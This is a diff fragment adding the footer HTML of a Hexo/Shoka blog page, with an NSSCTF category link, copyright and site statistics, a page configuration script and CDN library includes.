+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/NSSCTF/" title="分类于 NSSCTF精选">NSSCTF精选</a>
+</div>
+
+    <span><a href="/2023/05/12/nssctf2/" title="NSSCTF2">NSSCTF2</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">hq185187 @ 不良人天藏星</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="站点总字数">143k 字</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:10</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/06/08/原生类反序列化/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
